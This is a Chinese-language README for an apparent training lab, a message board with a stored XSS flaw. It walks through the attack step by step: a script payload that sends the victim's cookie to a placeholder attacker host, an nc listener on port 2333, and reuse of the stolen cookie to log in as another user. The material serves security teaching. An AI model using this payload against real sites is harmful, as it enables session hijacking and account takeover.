# 存储型XSS漏洞环境
### 测试环境

本环境是一套存在存储型XSS漏洞的留言管理系统.

### 房多多漏洞库
[经纪人产品存在存储型XSS,导致进入后台系统](http://sec.fangdd.net/view_markdown/27/)
### 跨站漏洞利用
> 假定启动后的环境如下：
>
> 攻击者 IP: {{remoteip}}

1. 攻击者在浏览器[打开服务](http://{{ip}}:{{port[0]}}),注册用户A,然后在留言板中留言.
留言时,输入我们构造的xss pyaload
```
 测试留言 <script>var img=document.createElement("img");
 img.src="http://{{remoteip}}:2333/log?"+escape(document.cookie);
 document.body.appendChild(img);</script>
```
2. 在攻击者机器上使用 nc 监听

 ```
 $ nc -lvp 2333
 ```

3. 刷新留言板页面,2333端口接收到一条HTTP请求,参数中带有cookie
![](vuln/xss1/1.png)

4. 利用此cookie可以登陆到A用户账户

### 参考资料
[给开发者的终极XSS防护备忘录](http://{{ip}}:{{webport}}/vuln/xss1/xss.pdf)
